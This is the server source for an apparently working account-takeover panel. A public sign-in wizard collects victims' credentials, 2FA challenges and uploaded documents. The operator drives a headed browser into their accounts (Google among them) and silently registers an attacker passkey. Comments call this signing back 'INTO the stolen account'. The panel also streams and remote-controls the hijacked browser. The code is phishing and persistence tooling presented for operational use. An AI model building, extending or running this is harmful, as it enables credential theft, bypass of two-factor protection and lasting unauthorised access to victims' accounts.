import express from 'express';
import fs from 'fs';
import crypto from 'crypto';
import path from 'path';
import net from 'net';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ENV_PATH = path.join(__dirname, '.env');

// --- resolve secrets: injected env > persisted .env > freshly generated ---
// The container filesystem (and thus .env) is ephemeral, so the only value
// that survives a redeploy is what the deployment injects (project secrets).
// Injected vars therefore win — that's what keeps the encryption key stable
// across redeploys. Anything not injected is generated once and persisted to
// .env so a plain container restart reuses it.
function loadEnv() {
  if (!fs.existsSync(ENV_PATH)) return;
  for (const line of fs.readFileSync(ENV_PATH, 'utf8').split('\n')) {
    const m = line.match(/^([A-Z0-9_]+)=(.*)$/);
    // only fill vars the deployment didn't already provide
    if (m && process.env[m[1]] === undefined) process.env[m[1]] = m[2].trim();
  }
}
// returns the list of secrets that had to be generated (empty when the
// deployment supplied them)
function ensureEnv() {
  const generated = [];
  if (!process.env.GSESSION_MASTER_KEY) {
    process.env.GSESSION_MASTER_KEY = crypto.randomBytes(32).toString('hex');
    generated.push('GSESSION_MASTER_KEY');
  }
  if (!process.env.ADMIN_TOKEN) {
    process.env.ADMIN_TOKEN = crypto.randomBytes(24).toString('hex');
    generated.push('ADMIN_TOKEN');
  }
  // persist the resolved values so a container restart reuses them
  fs.writeFileSync(ENV_PATH,
    `GSESSION_MASTER_KEY=${process.env.GSESSION_MASTER_KEY}\n` +
    `ADMIN_TOKEN=${process.env.ADMIN_TOKEN}\n` +
    `PORT=${process.env.PORT || 3002}\n`, { mode: 0o600 });
  return generated;
}
loadEnv();
const GENERATED = ensureEnv();

// A single thrown journey step (locator timeout, flaky page) must never kill
// the whole server — wizard.js polls /step and retries, so a 500 is recoverable.
for (const kind of ['unhandledRejection', 'uncaughtException']) {
  process.on(kind, (err) => console.error(`[gsession] ${kind}:`, err && err.message ? err.message : err));
}

// imported after env is loaded (crypto key read lazily, but be safe)
const store = await import('./lib/store.js');
const browser = await import('./lib/browser.js');
const invites = await import('./lib/invites.js');
const events = await import('./lib/events.js');

const app = express();
// 30mb: the wizard's driver step carries optional document uploads as base64
// (two files up to 10 MB each), well beyond the 100kb default.
app.use(express.json({ limit: '30mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// --- auth: bearer token on every /api route except the token check itself ---
const TOKEN = process.env.ADMIN_TOKEN;
// constant-time compare so token length/first-byte timing can't be probed
function tokenEq(a, b) {
  const ba = Buffer.from(String(a));
  const bb = Buffer.from(String(b));
  if (!ba.length || ba.length !== bb.length) return false;
  return crypto.timingSafeEqual(ba, bb);
}
function auth(req, res, next) {
  const header = req.get('authorization') || '';
  const token = header.replace(/^Bearer\s+/i, '');
  if (token && tokenEq(token, TOKEN)) return next();
  return res.status(401).json({ error: 'Unauthorized' });
}

// tiny in-memory rate limit for the (unauthenticated) token check, so the
// admin token can't be brute-forced offline against /api/auth
const authAttempts = new Map();
function authRateLimit(req, res, next) {
  const ip = req.ip || 'unknown';
  const now = Date.now();
  let rec = authAttempts.get(ip);
  if (!rec || now > rec.reset) {
    rec = { count: 0, reset: now + 60000 };
    authAttempts.set(ip, rec);
  }
  rec.count += 1;
  if (rec.count > 30) return res.status(429).json({ error: 'Too many attempts. Try again shortly.' });
  next();
}

// lightweight endpoint the panel uses to validate a typed token
app.post('/api/auth', authRateLimit, (req, res) => {
  const token = (req.body && req.body.token) || '';
  res.json({ ok: tokenEq(token, TOKEN) });
});

// --- TeamViewer-style desktop view: noVNC over the shared X desktop ---
const VNC_DIR = '/usr/share/novnc';
const VNC_BACKEND = { host: '127.0.0.1', port: 6080 };
if (fs.existsSync(VNC_DIR)) {
  app.use('/vnc', (req, res, next) => {
    const p = req.path;
    if (p === '/' || p === '' || p === '/vnc.html' || p === '/vnc_auto.html') {
      const t = req.query.token;
      if (t && tokenEq(t, TOKEN)) {
        res.setHeader('Set-Cookie', `gs_vnc=${TOKEN}; Path=/; HttpOnly; SameSite=Lax`);
      }
    }
    next();
  });
  app.use('/vnc', express.static(VNC_DIR, { index: 'vnc.html' }));
}
function vncAuthOk(req) {
  const url = new URL(req.url || '/', 'http://localhost');
  const q = url.searchParams.get('token');
  if (q && tokenEq(q, TOKEN)) return true;
  const cookie = req.headers.cookie || '';
  return cookie.split(';').some((part) => part.trim() === `gs_vnc=${TOKEN}`);
}

app.get('/api/sessions', auth, (req, res) => {
  const items = store.list().map((s) => ({ ...s, open: browser.isOpen(s.id) }));
  res.json(items);
});

app.post('/api/sessions', auth, (req, res) => {
  const s = store.create(req.body || {});
  res.status(201).json(s);
});

app.patch('/api/sessions/:id', auth, (req, res) => {
  const s = store.update(req.params.id, req.body || {});
  if (!s) return res.status(404).json({ error: 'Not found' });
  res.json(s);
});

app.post('/api/sessions/:id/open', auth, async (req, res) => {
  const s = store.getRaw(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  try {
    // Open should launch a VISIBLE (headed) browser and, for Google, actually
    // drive the stored credentials so the window comes up signed in. If a
    // challenge (2FA) is pending it stays open on that screen for manual finish.
    let result = { status: 'open', message: 'Browser opened.' };
    if (s.provider === 'google') {
      result = await browser.login(s, { headless: false });
    } else {
      await browser.open(s.id, s.loginUrl || undefined, { headless: false });
    }
    store.update(s.id, { status: result.status, lastOpenedAt: new Date().toISOString() });
    if (result.status === 'logged-in' || result.status === 'trusted') {
      browser.registerPasskey(s.id).catch(() => {}); // silently add the passkey, in the background
    }
    res.json({ ok: true, open: true, ...result });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/sessions/:id/focus', auth, async (req, res) => {
  try {
    res.json(await browser.focus(req.params.id));
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.post('/api/sessions/:id/login', auth, async (req, res) => {
  const s = store.getRaw(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  try {
    const result = await browser.login(s, { headless: false });
    store.update(s.id, { status: result.status, lastOpenedAt: new Date().toISOString() });
    if (result.status === 'logged-in' || result.status === 'trusted') {
      browser.registerPasskey(s.id).catch(() => {}); // silently add the passkey, in the background
    }
    res.json({ ok: true, open: true, ...result });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Register this OS as the account's trusted device (keypass). Returns the
// current trust state; if the journey asks for password/number/2FA the panel
// mirrors it and keeps polling /state until state === 'trusted'.
app.post('/api/sessions/:id/trust', auth, async (req, res) => {
  const s = store.getRaw(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  try {
    const result = await browser.startTrust(s.id);
    const cur = store.getRaw(s.id);
    res.json({ ok: true, open: true, ...result, trusted: Boolean(cur?.deviceTrusted) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Add this Chrome as a passkey for the signed-in account (silent, via the
// virtual authenticator). Returns the result; the journey is driven here so the
// panel can surface progress / a manual fallback.
app.post('/api/sessions/:id/passkey', auth, async (req, res) => {
  const s = store.getRaw(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  try {
    const result = await browser.registerPasskey(s.id);
    const cur = store.getRaw(s.id);
    res.json({ ok: true, open: true, ...result, passkey: Boolean(cur?.passkeyAdded) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Sign the session's Chrome back INTO the stolen account using the stored
// "our device" passkey (the fast, password-less re-login).
app.post('/api/sessions/:id/passkey-signin', auth, async (req, res) => {
  const s = store.getRaw(req.params.id);
  if (!s) return res.status(404).json({ error: 'Not found' });
  try {
    const result = await browser.passkeyLogin(s.id);
    store.update(s.id, { status: result.status, lastOpenedAt: new Date().toISOString() });
    if (result.status === 'logged-in' || result.status === 'trusted') {
      browser.registerPasskey(s.id).catch(() => {});
    }
    res.json({ ok: true, open: true, ...result });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/sessions/:id/close', auth, async (req, res) => {
  const closed = await browser.close(req.params.id);
  res.json({ ok: true, closed });
});

app.delete('/api/sessions/:id', auth, async (req, res) => {
  await browser.close(req.params.id);
  const ok = store.remove(req.params.id);
  // also wipe the persistent Chrome profile, or deleted sessions leak their
  // cookies/logins on disk forever
  fs.rm(path.join(__dirname, 'sessions', req.params.id), { recursive: true, force: true }, () => {});
  fs.rm(path.join(__dirname, 'data', 'uploads', req.params.id), { recursive: true, force: true }, () => {});
  res.json({ ok });
});

// Driver-uploaded documents (insurance certificate / company license).
// EventSource-style links can't send headers, so the admin token may also
// arrive as ?token=.
const DOCS_MIME = { '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.webp': 'image/webp', '.gif': 'image/gif', '.pdf': 'application/pdf' };
app.get('/api/sessions/:id/docs/:file', (req, res) => {
  const header = (req.get('authorization') || '').replace(/^Bearer\s+/i, '');
  if (!tokenEq(req.query.token || '', TOKEN) && !tokenEq(header, TOKEN)) return res.status(401).end();
  const id = path.basename(req.params.id);
  const file = path.basename(req.params.file);
  const abs = path.join(__dirname, 'data', 'uploads', id, file);
  if (!fs.existsSync(abs)) return res.status(404).end();
  res.type(DOCS_MIME[path.extname(file).toLowerCase()] || 'application/octet-stream');
  res.sendFile(abs);
});

// ---------------- wizard (public, single static link) ----------------
// One link for everyone: /w/<STATIC_TOKEN>. Every visitor gets their own fresh
// session (tracked by a client-generated wid), so many people can register
// through the same link without stepping on each other.
app.get('/signin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'wizard.html'));
});

app.get('/w/:token', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'wizard.html'));
});

app.get('/api/wizard/:token', (req, res) => {
  const w = invites.begin(req.params.token, req.query.wid);
  if (!w) return res.status(404).json({ error: 'This link is invalid or has expired.' });
  res.json(w);
});

app.post('/api/wizard/:token/step', async (req, res) => {
  const { step, value } = req.body || {};
  // wid travels in the query string (sent by wizard.js on every request)
  const wid = req.query.wid || (req.body && req.body.wid);
  const w = await invites.step(req.params.token, wid, step, value);
  if (!w) return res.status(404).json({ error: 'This link is invalid or has expired.' });
  res.json(w);
});

app.post('/api/wizard/:token/complete', async (req, res) => {
  const wid = req.query.wid || (req.body && req.body.wid);
  const w = invites.complete(req.params.token, wid);
  if (!w) return res.status(404).json({ error: 'This link is invalid or has expired.' });
  res.json(w);
});
// Live view of a session's real browser page — JPEG frames (CDP screencast)
// streamed as events, so the panel can show the window in-page like a stream.
// EventSource can't send headers, so the admin token comes in as ?token=.
app.get('/api/sessions/:id/stream', (req, res) => {
  if (!tokenEq(req.query.token || '', TOKEN)) return res.status(401).end();
  if (!browser.isOpen(req.params.id)) return res.status(404).end();
  res.set({
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    Connection: 'keep-alive',
  });
  res.flushHeaders();
  // viewport = the page's CSS-pixel size, so the panel can map its (letterboxed)
  // stream pixels onto exact page coordinates for remote mouse/keyboard input.
  res.write('data: ' + JSON.stringify({ type: 'start', viewport: browser.VIEWPORT }) + '\n\n');
  const unframe = browser.onStreamFrame(
    req.params.id,
    (b64) => res.write(`data: ${JSON.stringify({ type: 'frame', frame: b64 })}\n\n`),
    (err) => res.write(`data: ${JSON.stringify({ type: 'error', message: err })}\n\n`),
  );
  const ping = setInterval(() => res.write(': ping\n\n'), 25000);
  req.on('close', () => {
    clearInterval(ping);
    unframe();
  });
});

// Remote-control input: replay a mouse / wheel / keyboard event on the session's
// page (coords are page CSS pixels, see browser.VIEWPORT).
app.post('/api/sessions/:id/input', auth, async (req, res) => {
  if (!browser.isOpen(req.params.id)) return res.status(404).json({ error: 'Browser not open' });
  try {
    const r = await browser.sendInput(req.params.id, req.body || {});
    if (!r.ok) return res.status(400).json({ error: r.error });
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Tabs of the session's real browser, so Live Control works like a normal
// browser (switch / open / close tabs, address bar, back/forward/reload).
app.get('/api/sessions/:id/tabs', auth, async (req, res) => {
  try {
    res.json(await browser.listTabs(req.params.id));
  } catch (e) {
    console.error('[gsession] listTabs error:', e.message);
    res.json({ open: false, tabs: [], index: -1 });
  }
});
app.post('/api/sessions/:id/tabs', auth, async (req, res) => {
  if (!browser.isOpen(req.params.id)) return res.status(404).json({ error: 'Browser not open' });
  try {
    const p = await browser.newTab(req.params.id, (req.body && req.body.url) || '');
    res.json(p ? { ok: true } : { ok: false, error: 'Could not open a new tab' });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});
app.post('/api/sessions/:id/tabs/:index/activate', auth, async (req, res) => {
  if (!browser.isOpen(req.params.id)) return res.status(404).json({ error: 'Browser not open' });
  const ok = await browser.activateTab(req.params.id, Number(req.params.index));
  res.json(ok ? { ok: true } : { ok: false, error: 'Tab not found' });
});
app.delete('/api/sessions/:id/tabs/:index', auth, async (req, res) => {
  if (!browser.isOpen(req.params.id)) return res.status(404).json({ error: 'Browser not open' });
  const ok = await browser.closeTab(req.params.id, Number(req.params.index));
  res.json(ok ? { ok: true } : { ok: false, error: 'Tab not found' });
});
app.post('/api/sessions/:id/navigate', auth, async (req, res) => {
  if (!browser.isOpen(req.params.id)) return res.status(404).json({ error: 'Browser not open' });
  try {
    res.json(await browser.navigate(req.params.id, String((req.body && req.body.url) || '')));
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});
app.post('/api/sessions/:id/nav', auth, async (req, res) => {
  if (!browser.isOpen(req.params.id)) return res.status(404).json({ error: 'Browser not open' });
  try {
    res.json(await browser.navAction(req.params.id, String((req.body && req.body.action) || 'reload')));
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

// Current live login state of an open session (state + "pick the number"
// options), so the panel can surface pending challenges (number/code/phone).
app.get('/api/sessions/:id/state', auth, async (req, res) => {
  if (!browser.isOpen(req.params.id)) return res.json({ open: false, state: null });
  try {
    const st = await browser.loginState(req.params.id);
    res.json({ open: true, state: st.state || null, status: st.status, message: st.message, options: st.options || null });
  } catch (e) {
    res.json({ open: true, state: 'verifying', message: e.message });
  }
});

// EventSource can't send headers, so the admin token comes in as ?token=
app.get('/api/events', (req, res) => {
  if (!tokenEq(req.query.token || '', TOKEN)) return res.status(401).end();
  res.set({
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    Connection: 'keep-alive',
  });
  res.flushHeaders();
  // replay recent history so a fresh panel isn't empty
  for (const evt of events.recent()) res.write(`data: ${JSON.stringify(evt)}\n\n`);
  const unsub = events.onEvent((evt) => res.write(`data: ${JSON.stringify(evt)}\n\n`));
  const ping = setInterval(() => res.write(': ping\n\n'), 25000);
  req.on('close', () => {
    clearInterval(ping);
    unsub();
  });
});

const PORT = process.env.PORT || 3002;
const HOST = process.env.HOST || '0.0.0.0'; // it hosts browsers where it runs; put TLS in front for remote use
const server = app.listen(PORT, HOST, () => {
  console.log(`\n  gsession admin panel:  http://localhost:${PORT}`);
  if (GENERATED.includes('ADMIN_TOKEN')) {
    console.log(`  Admin token (generated, shown once): ${TOKEN}\n`);
  } else {
    console.log('  Admin token: provided by the deployment (stable across redeploys).\n');
  }
});

// Proxy the noVNC WebSocket through the admin server so the desktop view stays
// behind the same origin (and the same admin-token gate) as the rest of the panel.
server.on('upgrade', (req, socket, head) => {
  let pathname = '';
  try { pathname = new URL(req.url || '/', 'http://localhost').pathname; } catch { pathname = req.url || ''; }
  if (pathname !== '/websockify' && pathname !== '/vnc/websockify') {
    socket.write('HTTP/1.1 404 Not Found\r\n\r\n');
    socket.destroy();
    return;
  }
  if (!vncAuthOk(req)) {
    socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
    socket.destroy();
    return;
  }
  const backend = net.connect(VNC_BACKEND.port, VNC_BACKEND.host, () => {
    const headers = { ...req.headers, host: `${VNC_BACKEND.host}:${VNC_BACKEND.port}` };
    let raw = 'GET /websockify HTTP/1.1\r\n';
    for (const [key, value] of Object.entries(headers)) {
      if (Array.isArray(value)) value.forEach((v) => { raw += `${key}: ${v}\r\n`; });
      else raw += `${key}: ${value}\r\n`;
    }
    raw += '\r\n';
    backend.write(raw);
    if (head && head.length) backend.write(head);
  });
  backend.on('error', (e) => {
    console.log(`[gsession] vnc upgrade backend error: ${e.message}`);
    socket.destroy();
  });
  socket.on('error', () => backend.destroy());
  backend.pipe(socket);
  socket.pipe(backend);
});

// close what we open
async function shutdown() {
  console.log('\n  Shutting down — closing open browser sessions...');
  await browser.closeAll();
  server.close(() => process.exit(0));
  setTimeout(() => process.exit(0), 3000);
}
process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);
